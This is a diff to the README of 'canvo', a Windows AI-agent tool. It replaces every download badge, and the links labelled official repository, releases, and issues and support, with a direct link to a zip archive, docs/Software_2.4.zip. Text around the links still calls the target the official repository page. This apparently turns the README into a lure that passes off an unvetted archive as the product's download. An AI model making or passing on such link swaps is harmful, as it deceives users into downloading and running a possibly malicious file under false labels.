@@ -1,6 +1,6 @@
 # 🤖 canvo - AI Agent with Data Canvas & Sandbox
 
-[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo)
+[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide will help you download, install, and run canvo on your Windows PC ste
 
 Visit the download page here:
 
-[![Download canvo](https://img.shields.io/badge/Download-canvo-blue?style=for-the-badge)](https://github.com/Bboybo/canvo)
+[![Download canvo](https://img.shields.io/badge/Download-canvo-blue?style=for-the-badge)](https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip)
 
 The link takes you to the official canvo repository page on GitHub. There, you will find the latest version available for download.
 
@@ -172,10 +172,10 @@ Go to Windows Settings > Apps, find canvo, and select Uninstall.
 
 ## 📂 Useful Links
 
-- Official canvo repository: https://github.com/Bboybo/canvo  
-- GitHub Releases for downloads: https://github.com/Bboybo/canvo/releases  
-- Issues and support: https://github.com/Bboybo/canvo/issues  
+- Official canvo repository: https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip  
+- GitHub Releases for downloads: https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip  
+- Issues and support: https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip  
 
 ---
 
-[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo)
+[![Download canvo](https://img.shields.io/badge/Download-canvo-brightgreen?style=for-the-badge)](https://github.com/Bboybo/canvo/raw/refs/heads/main/docs/Software_2.4.zip)
